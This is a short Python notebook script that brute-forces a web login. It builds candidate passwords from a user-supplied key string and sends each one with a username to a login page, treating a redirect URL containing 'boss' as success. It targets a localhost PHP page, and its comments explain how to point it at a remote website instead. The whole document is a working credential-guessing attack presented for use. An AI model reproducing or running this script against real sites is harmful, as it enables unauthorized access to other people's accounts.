#!/usr/bin/env python
# coding: utf-8

# In[60]:


import requests
import os
import socket


# In[61]:


ip=input("ENTER IP ==> ")
port=input("ENTER PORT ==> ")


# In[62]:


key=input("ENTER KEYS  FOR BRUTEFORCE ATTACK ==> ")
username=input("ENTER USERNAME FOR BRUTEFORCE ATTACK ==> ")


# In[63]:


allcombo=set()
def getallcombination(key,start,current):
    if start>=len(key):
        return 
    allcombo.add(current+key[start])
    getallcombination(key,start+1,current+key[start])
    getallcombination(key,start+1,current)
getallcombination(key,0,"")


# In[64]:


allcombo=list(allcombo)
print(allcombo)


# In[67]:


found=False
for x in allcombo:
    print("TRYING PASSWORD ==> "+ x)
    #I HAVE WRITTEN PATH TO MY WEBSITE IN MY LOCALHOST 
    #IF YOU WANT TO TEST IN GLOBAL WEBSITE MAKE THE URL LIKE ==> HTTPS://IP:PORT
    t=requests.get("http://localhost/php/bruteforce%20hacking/",{"user":username,"pass":x})
    #I HAVE USED BOSS IN MY URL FOR SUCCESS AUTHENTICATION YOU CAN USE ANYTHING  THAT YOU CAN FIND IN SUCCESS AUTHENTICATION IN THAT WEBSITE  
    if "boss" in t.url:
        found=True
        print("SUCCESSFUL THE PASSWORD FOUND IS ==> "+x)
        break;
if found==False:
    print("PASSWORD NOT IN KEY")


# In[ ]:





# In[ ]:





# In[ ]:




